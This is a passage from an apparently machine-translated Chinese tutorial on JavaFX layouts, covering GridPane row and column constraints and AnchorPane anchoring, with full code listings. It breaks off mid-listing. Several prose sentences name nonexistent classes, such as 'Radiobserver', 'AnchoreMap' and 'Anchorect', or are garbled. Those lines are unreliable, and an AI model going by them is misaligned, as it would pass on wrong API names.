<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">GridPane</span> <span class="variable">gp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GridPane</span>();</span><br><span class="line">gp.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>) );</span><br><span class="line">gp.setHgap( <span class="number">4</span> );</span><br><span class="line">gp.setVgap( <span class="number">10</span> );</span><br><span class="line"></span><br><span class="line">VBox.setVgrow(gp, Priority.ALWAYS );</span><br></pre></td></tr></table></figure>
此代码创建本文中使用的UI控件对象。 注意，Priority现在被实现为包含Radiobserver的`VBox`。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Label</span> <span class="variable">lblTitle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Support Ticket&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Email&quot;</span>);</span><br><span class="line"><span class="type">TextField</span> <span class="variable">tfEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblContract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Contract&quot;</span>);</span><br><span class="line"><span class="type">TextField</span> <span class="variable">tfContract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblPriority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Priority&quot;</span>);</span><br><span class="line"><span class="type">RadioButton</span> <span class="variable">rbMedium</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RadioButton</span>(<span class="string">&quot;Medium&quot;</span>);</span><br><span class="line"><span class="type">RadioButton</span> <span class="variable">rbHigh</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RadioButton</span>(<span class="string">&quot;High&quot;</span>);</span><br><span class="line"><span class="type">RadioButton</span> <span class="variable">rbLow</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RadioButton</span>(<span class="string">&quot;Low&quot;</span>);</span><br><span class="line"><span class="type">VBox</span> <span class="variable">priorityVBox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();</span><br><span class="line">priorityVBox.setSpacing( <span class="number">2</span> );</span><br><span class="line">GridPane.setVgrow(priorityVBox, Priority.SOMETIMES);</span><br><span class="line">priorityVBox.getChildren().addAll( lblPriority, rbMedium, rbHigh, rbLow );</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblSeverity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Severity&quot;</span>);</span><br><span class="line">ObservableList&lt;String&gt; severities =</span><br><span class="line">    FXCollections.observableArrayList(<span class="string">&quot;Blocker&quot;</span>, <span class="string">&quot;Workaround&quot;</span>, <span class="string">&quot;N/A&quot;</span>);</span><br><span class="line">ComboBox&lt;String&gt; cbSeverity = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(severities);</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblCategory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Category&quot;</span>);</span><br><span class="line">ObservableList&lt;String&gt; categories =</span><br><span class="line">    FXCollections.observableArrayList(<span class="string">&quot;Bug&quot;</span>, <span class="string">&quot;Feature&quot;</span>);</span><br><span class="line">ComboBox&lt;String&gt; cbCategory = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(categories);</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Problem&quot;</span>);</span><br><span class="line"><span class="type">TextField</span> <span class="variable">tfProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Description&quot;</span>);</span><br><span class="line"><span class="type">TextArea</span> <span class="variable">taDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextArea</span>();</span><br></pre></td></tr></table></figure>
电子邮件、合同、问题和说明的标签和值控制配对放在一个列中。 它们应该采用`GridPane`的整个宽度，因此每个都将其columnSpan设置为2。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GridPane.setColumnSpan( tfEmail, <span class="number">2</span> );</span><br><span class="line">GridPane.setColumnSpan( tfContract, <span class="number">2</span> );</span><br><span class="line">GridPane.setColumnSpan( tfProblem, <span class="number">2</span> );</span><br><span class="line">GridPane.setColumnSpan( taDescription, <span class="number">2</span> );</span><br></pre></td></tr></table></figure>
新的优先级无线电水平匹配的严重性和类别的四个控件。 这个rowSpan设置指示JavaFX将包含RadioButton的VBox放在一个高度为四行的合并单元格中。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GridPane.setRowSpan( priorityVBox, <span class="number">4</span> );</span><br></pre></td></tr></table></figure>
## 行约束
此时，代码反映了[使用行和列跨越的示例应用程序](https://fxdocs.github.io/docs/html5/#initial_image)中提供的UI屏幕截图。 要重新分配窗体底部的额外空间，请使用RowConstraints对象在`TextArea`的行上设置Priority.ALWAYS。 这将导致`TextArea`增长，以填充可用的空间。
这段代码是一个`RowConstraints`对象到`GridPane`的`TextArea`。 在setter之前，`RowConstraints`对象被分配给所有其他行。 当您指定第12行而没有首先分配对象时，`getRowConstraints()`的set方法将抛出一个索引异常。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RowConstraints</span> <span class="variable">taDescriptionRowConstraints</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RowConstraints</span>();</span><br><span class="line">taDescriptionRowConstraints.setVgrow(Priority.ALWAYS);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">13</span>; i++ ) &#123;</span><br><span class="line">    gp.getRowConstraints().add( <span class="keyword">new</span> <span class="title class_">RowConstraints</span>() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gp.getRowConstraints().set( <span class="number">12</span>, taDescriptionRowConstraints );</span><br></pre></td></tr></table></figure>
作为替代语法，有一个setConstraints（）方法可从`GridPane`中获得。 这将传入几个值，并消除了对`TextArea`的专用columnSpan set调用的需要。 前面清单中的`RowConstraints`代码将不会出现在完成的程序中。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">gp.setConstraints(taDescription,</span><br><span class="line">                  <span class="number">0</span>, <span class="number">12</span>,</span><br><span class="line">                  <span class="number">2</span>, <span class="number">1</span>,</span><br><span class="line">                  HPos.LEFT, VPos.TOP,</span><br><span class="line">                  Priority.SOMETIMES, Priority.ALWAYS);</span><br></pre></td></tr></table></figure>
此代码标识（0，12）处的`Node`，即`TextArea`。 `TextArea`将跨越2列，但只有1行。 HPos和Vpos设置为左上角。 最后，hgrow的`Priority`是SOMETIMES，vgrow是ALWAYS。 由于`TextArea`是唯一一行"ALWAYS"，它将获得额外的空间。 如果有其他ALWAYS设置，则空间将在多行之间共享。
## 列约束
要正确分配Severity和Category控件周围的空间，将指定ColumnConstraints。 默认行为分配给第一列的空间较少，因为Priority RadioValue较小。 下面的线框显示了所需的布局，其中具有由4像素（Hgap）的gutter分隔的相等列。
要使列宽相等，请定义两个`ColumnConstraint`对象并使用百分比说明符。
这样才会保持横向比例：
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ColumnConstraints</span> <span class="variable">col1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ColumnConstraints</span>();</span><br><span class="line">col1.setPercentWidth( <span class="number">50</span> );</span><br><span class="line"><span class="type">ColumnConstraints</span> <span class="variable">col2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ColumnConstraints</span>();</span><br><span class="line">col2.setPercentWidth( <span class="number">50</span> );</span><br><span class="line">gp.getColumnConstraints().addAll( col1, col2 );</span><br></pre></td></tr></table></figure>
### 完整代码
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.layout;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.collections.FXCollections;  </span><br><span class="line"><span class="keyword">import</span> javafx.collections.ObservableList;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.HPos;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Insets;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.VPos;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.*;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.ColumnConstraints;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.GridPane;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.Priority;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.VBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line"><span class="keyword">import</span> org.scenicview.ScenicView;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstraintsGridPaneApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">GridPane</span> <span class="variable">gp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GridPane</span>();  </span><br><span class="line">        gp.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>) );  </span><br><span class="line">        gp.setHgap( <span class="number">4</span> );  </span><br><span class="line">        gp.setVgap( <span class="number">10</span> );  </span><br><span class="line">  </span><br><span class="line">        VBox.setVgrow(gp, Priority.ALWAYS );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblTitle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Support Ticket&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Email&quot;</span>);  </span><br><span class="line">        <span class="type">TextField</span> <span class="variable">tfEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblContract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Contract&quot;</span>);  </span><br><span class="line">        <span class="type">TextField</span> <span class="variable">tfContract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblPriority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Priority&quot;</span>);  </span><br><span class="line">        <span class="type">RadioButton</span> <span class="variable">rbMedium</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RadioButton</span>(<span class="string">&quot;Medium&quot;</span>);  </span><br><span class="line">        <span class="type">RadioButton</span> <span class="variable">rbHigh</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RadioButton</span>(<span class="string">&quot;High&quot;</span>);  </span><br><span class="line">        <span class="type">RadioButton</span> <span class="variable">rbLow</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RadioButton</span>(<span class="string">&quot;Low&quot;</span>);  </span><br><span class="line">        <span class="type">VBox</span> <span class="variable">priorityVBox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();  </span><br><span class="line">        priorityVBox.setSpacing( <span class="number">2</span> );  </span><br><span class="line">        GridPane.setVgrow(priorityVBox, Priority.ALWAYS);  </span><br><span class="line">        priorityVBox.getChildren().addAll( lblPriority, rbMedium, rbHigh, rbLow );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblSeverity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Severity&quot;</span>);  </span><br><span class="line">        ObservableList&lt;String&gt; severities = FXCollections.observableArrayList(<span class="string">&quot;Blocker&quot;</span>, <span class="string">&quot;Workaround&quot;</span>, <span class="string">&quot;N/A&quot;</span>);  </span><br><span class="line">        ComboBox&lt;String&gt; cbSeverity = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(severities);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblCategory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Category&quot;</span>);  </span><br><span class="line">        ObservableList&lt;String&gt; categories = FXCollections.observableArrayList(<span class="string">&quot;Bug&quot;</span>, <span class="string">&quot;Feature&quot;</span>);  </span><br><span class="line">        ComboBox&lt;String&gt; cbCategory = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(categories);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Problem&quot;</span>);  </span><br><span class="line">        <span class="type">TextField</span> <span class="variable">tfProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Description&quot;</span>);  </span><br><span class="line">        <span class="type">TextArea</span> <span class="variable">taDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextArea</span>();  </span><br><span class="line">  </span><br><span class="line">        gp.add( lblTitle,       <span class="number">0</span>, <span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line">        gp.add( lblEmail,       <span class="number">0</span>, <span class="number">1</span>);  </span><br><span class="line">        gp.add(tfEmail,         <span class="number">0</span>, <span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        gp.add( lblContract,    <span class="number">0</span>, <span class="number">3</span> );  </span><br><span class="line">        gp.add( tfContract,     <span class="number">0</span>, <span class="number">4</span> );  </span><br><span class="line">  </span><br><span class="line">        gp.add( priorityVBox,   <span class="number">0</span>, <span class="number">5</span>);  </span><br><span class="line">  </span><br><span class="line">        gp.add( lblSeverity,    <span class="number">1</span>, <span class="number">5</span>);  </span><br><span class="line">        gp.add( cbSeverity,     <span class="number">1</span>, <span class="number">6</span>);  </span><br><span class="line">        gp.add( lblCategory,    <span class="number">1</span>, <span class="number">7</span>);  </span><br><span class="line">        gp.add( cbCategory,     <span class="number">1</span>, <span class="number">8</span>);  </span><br><span class="line">  </span><br><span class="line">        gp.add( lblProblem,     <span class="number">0</span>, <span class="number">9</span>);  </span><br><span class="line">        gp.add( tfProblem,      <span class="number">0</span>, <span class="number">10</span>);  </span><br><span class="line">  </span><br><span class="line">        gp.add( lblDescription, <span class="number">0</span>, <span class="number">11</span>);  </span><br><span class="line">        gp.add( taDescription,  <span class="number">0</span>, <span class="number">12</span>);  </span><br><span class="line">  </span><br><span class="line">        GridPane.setColumnSpan( tfEmail, <span class="number">2</span> );  </span><br><span class="line">        GridPane.setColumnSpan( tfContract, <span class="number">2</span> );  </span><br><span class="line">        GridPane.setColumnSpan( tfProblem, <span class="number">2</span> );  </span><br><span class="line">  </span><br><span class="line">        GridPane.setRowSpan( priorityVBox, <span class="number">4</span> );  </span><br><span class="line">  </span><br><span class="line">        gp.setConstraints(taDescription,  </span><br><span class="line">                          <span class="number">0</span>, <span class="number">12</span>,  </span><br><span class="line">                          <span class="number">2</span>, <span class="number">1</span>,  </span><br><span class="line">                          HPos.LEFT, VPos.TOP,  </span><br><span class="line">                          Priority.SOMETIMES, Priority.ALWAYS);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ColumnConstraints</span> <span class="variable">col1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ColumnConstraints</span>();  </span><br><span class="line">        col1.setPercentWidth( <span class="number">50</span> );  </span><br><span class="line">        <span class="type">ColumnConstraints</span> <span class="variable">col2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ColumnConstraints</span>();  </span><br><span class="line">        col2.setPercentWidth( <span class="number">50</span> );  </span><br><span class="line">        gp.getColumnConstraints().addAll( col1, col2 );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Separator</span> <span class="variable">sep</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Separator</span>(); <span class="comment">// hr  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">ButtonBar</span> <span class="variable">buttonBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ButtonBar</span>();  </span><br><span class="line">        buttonBar.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>) );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">saveButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Save&quot;</span>);  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">cancelButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Cancel&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        buttonBar.setButtonData(saveButton, ButtonBar.ButtonData.OK_DONE);  </span><br><span class="line">        buttonBar.setButtonData(cancelButton, ButtonBar.ButtonData.CANCEL_CLOSE);  </span><br><span class="line">  </span><br><span class="line">        buttonBar.getButtons().addAll(saveButton, cancelButton);  </span><br><span class="line">  </span><br><span class="line">        vbox.getChildren().addAll( gp, sep, buttonBar );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(vbox);  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;Grid Pane App&quot;</span>);  </span><br><span class="line">        primaryStage.setScene(scene);  </span><br><span class="line">        primaryStage.setWidth( <span class="number">414</span> );  </span><br><span class="line">        primaryStage.setHeight( <span class="number">736</span>  );  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">  </span><br><span class="line">        ScenicView.show(scene);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果如下： 
<img src="/image/Pasted image 20240501162331.png" alt="20240501162331.png" />
## AnchorPane
`AnchorPane`是一个容器控件，它根据边缘定义其布局。 当放置在容器中时，`AnchorPane`拉伸以填充可用空间。 `AnchorPane`的子元素将它们的位置和大小表示为与边的距离：Top、Left、Bottom、Right。 如果一个或两个锚设置被放置在`AnchorPane`子项上，则子项将被固定到窗口的该角。 如果使用了两个以上的锚设置，子对象将被拉伸以填充可用的水平和垂直空间。
这个模型显示了一个被一组控件包围的`TextArea`：一个`Hyperlink`和两个状态指示器。 由于`TextArea`将包含所有内容，因此它最初应该占用大部分空间，并且应该通过调整大小获得任何额外的空间。 在外围，右上角有一个`Hyperlink`，右下角有一个连接`Label`和`Circle`，左下角有一个状态`Label`。
### 锚点
要开始布局，请创建一个`AnchorPane`对象并将其添加到`Scene`。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AnchorPane</span> <span class="variable">ap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnchorPane</span>();</span><br><span class="line"><span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(ap);</span><br></pre></td></tr></table></figure>
使用AnchoreMap类的静态方法设置参数。 方法-每条边一个-接受`Node`和偏移。     对于`Hyperlink`，将设置顶边锚和右边锚。 将每条边的偏移设置为10.0，以便链接不会被压缩到侧面。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Hyperlink</span> <span class="variable">signoutLink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hyperlink</span>(<span class="string">&quot;Sign Out&quot;</span>);</span><br><span class="line"></span><br><span class="line">ap.getChildren().add( signoutLink );</span><br><span class="line"></span><br><span class="line">AnchorPane.setTopAnchor( signoutLink, <span class="number">10.0d</span> );</span><br><span class="line">AnchorPane.setRightAnchor( signoutLink, <span class="number">10.0d</span> );</span><br></pre></td></tr></table></figure>
当屏幕调整大小时，锚定器将调整大小，而signoutLink将保持其右上角的位置。 因为既没有指定左锚点也没有指定下锚点，所以不会拉伸signoutLink。
接下来，添加连接`Label`和`Circle`。 这些控件被包装在一个`HBox`中。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Circle</span> <span class="variable">circle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line">circle.setFill(Color.GREEN );</span><br><span class="line">circle.setRadius(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">connLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Connection&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">HBox</span> <span class="variable">connHBox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>();</span><br><span class="line">connHBox.setSpacing( <span class="number">4.0d</span> );</span><br><span class="line">connHBox.setAlignment(Pos.BOTTOM_RIGHT);</span><br><span class="line">connHBox.getChildren().addAll( connLabel, circle );</span><br><span class="line"></span><br><span class="line">AnchorPane.setBottomAnchor( connHBox, <span class="number">10.0d</span> );</span><br><span class="line">AnchorPane.setRightAnchor( connHBox, <span class="number">10.0d</span> );</span><br><span class="line"></span><br><span class="line">ap.getChildren().add( connHBox );</span><br></pre></td></tr></table></figure>
与signoutLink一样，connHBox固定在屏幕上的某个位置。 connHBox设置为距离底部边缘10像素，距离右侧边缘10像素。
添加左下角状态`Label`。 左侧和底部锚点已设置。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Label</span> <span class="variable">statusLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Program status&quot;</span>);</span><br><span class="line">ap.getChildren().add( statusLabel );</span><br><span class="line"></span><br><span class="line">AnchorPane.setBottomAnchor( statusLabel, <span class="number">10.0d</span> );</span><br><span class="line">AnchorPane.setLeftAnchor( statusLabel, <span class="number">10.0d</span> );</span><br></pre></td></tr></table></figure>
<img src="/image/Pasted image 20240501171048.png" alt="20240501171048.png" />
### 调整大小
外围上的控件大小可能不同。例如，状态消息或连接消息可以更长。 然而，通过将左下状态`Label`向右延伸并将右下连接状态`Label`向左延伸，可以在该布局中容纳额外的长度。 使用此布局调整大小将以绝对值移动这些控件，但它们将保留各自的边缘加上偏移量。
但这并不意味着#1。 因为`TextArea`可能包含很多内容，所以它应该接收用户给窗口的任何额外空间。 此控件将锚定到`TextArea`的所有四个角。 这将导致`AnchorPane`在窗口调整大小时调整大小。 `TextArea`固定在左上角，当用户将窗口手柄拖到右下角时，`TextArea`的右下角也会移动。
突出显示的框显示与`TextArea`相邻的控件相对于边保持其位置。 `TextArea`本身的大小是基于窗口大小调整。 `TextArea`的顶部和底部偏移量考虑了其他控件，因此它们不会被隐藏。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TextArea</span> <span class="variable">ta</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextArea</span>();</span><br><span class="line"></span><br><span class="line">AnchorPane.setTopAnchor( ta, <span class="number">40.0d</span> );</span><br><span class="line">AnchorPane.setBottomAnchor( ta, <span class="number">40.0d</span> );</span><br><span class="line">AnchorPane.setRightAnchor( ta, <span class="number">10.0d</span> );</span><br><span class="line">AnchorPane.setLeftAnchor( ta, <span class="number">10.0d</span> );</span><br><span class="line"></span><br><span class="line">ap.getChildren().add( ta );</span><br></pre></td></tr></table></figure>
`AnchorPane`是一个很好的选择，当你有一个可调整大小和固定位置的子项的混合。 如果只有一个子项需要安装，则首选其他控件（如带有`VBox`设置的`HBox`和`Priority`）。 使用这些控件而不是`AnchorPane`，其中单个子控件设置了所有四个锚点。 请记住，要在子对象上设置锚，您需要使用容器类的静态方法，如Anchorect.setTop锚（）。
### 完整代码
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.layout;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Pos;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.Hyperlink;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.Label;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.TextArea;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.AnchorPane;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.HBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.paint.Color;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.shape.Circle;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line"><span class="keyword">import</span> org.scenicview.ScenicView;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnchorPaneApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">AnchorPane</span> <span class="variable">ap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnchorPane</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// upper-right sign out control  </span></span><br><span class="line">        <span class="type">Hyperlink</span> <span class="variable">signoutLink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hyperlink</span>(<span class="string">&quot;Sign Out&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        ap.getChildren().add( signoutLink );  </span><br><span class="line">  </span><br><span class="line">        AnchorPane.setTopAnchor( signoutLink, <span class="number">10.0d</span> );  </span><br><span class="line">        AnchorPane.setRightAnchor( signoutLink, <span class="number">10.0d</span> );  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// lower-left status label  </span></span><br><span class="line">        <span class="type">Label</span> <span class="variable">statusLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Program status&quot;</span>);  </span><br><span class="line">        ap.getChildren().add( statusLabel );  </span><br><span class="line">  </span><br><span class="line">        AnchorPane.setBottomAnchor( statusLabel, <span class="number">10.0d</span> );  </span><br><span class="line">        AnchorPane.setLeftAnchor( statusLabel, <span class="number">10.0d</span> );  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// lower-right connection status control  </span></span><br><span class="line">        <span class="type">Circle</span> <span class="variable">circle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();  </span><br><span class="line">        circle.setFill(Color.GREEN );  </span><br><span class="line">        circle.setRadius(<span class="number">10</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">connLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Connection&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HBox</span> <span class="variable">connHBox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>();  </span><br><span class="line">        connHBox.setSpacing( <span class="number">4.0d</span> );  </span><br><span class="line">        connHBox.setAlignment(Pos.BOTTOM_RIGHT);  </span><br><span class="line">        connHBox.getChildren().addAll( connLabel, circle );  </span><br><span class="line">  </span><br><span class="line">        AnchorPane.setBottomAnchor( connHBox, <span class="number">10.0d</span> );  </span><br><span class="line">        AnchorPane.setRightAnchor( connHBox, <span class="number">10.0d</span> );  </span><br><span class="line">  </span><br><span class="line">        ap.getChildren().add( connHBox );  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// top-left content; takes up extra space  </span></span><br><span class="line">        <span 